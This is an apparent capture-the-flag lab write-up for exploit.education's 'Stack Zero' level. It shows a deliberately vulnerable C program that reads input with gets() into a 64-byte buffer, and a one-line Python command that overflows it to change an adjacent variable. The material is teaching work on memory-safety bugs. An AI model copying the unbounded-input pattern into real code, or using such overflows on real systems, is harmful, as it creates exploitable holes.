# Stack Zero

 * The aim is to change the contents of the changeme variable.
 *
 * Scientists have recently discovered a previously unknown species of
 * kangaroos, approximately in the middle of Western Australia. These
 * kangaroos are remarkable, as their insanely powerful hind legs give them
 * the ability to jump higher than a one story house (which is approximately
 * 15 feet, or 4.5 metres), simply because houses can't can't jump.

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  printf("%s\n", BANNER);

  locals.changeme = 0;
  gets(locals.buffer);

  if (locals.changeme != 0) {
    puts("Well done, the 'changeme' variable has been changed!");
  } else {
    puts(
        "Uh oh, 'changeme' has not yet been changed. Would you like to try "
        "again?");
  }

  exit(0);
}
```

This program reads from stdin and puts it into the struct attribute `locals.buffer` without any bounds checking. Our goal is to overwrite "changeme", which we can do by overflowing the 64 byte buffer. Since `changeme` is right next to `locals.buffer` we can overwrite it by providing 65 characters


## Solution
1. Send 65 `A`'s:
`python3 -c "print('A'*65)" | /opt/phoenix/amd64/stack-zero`
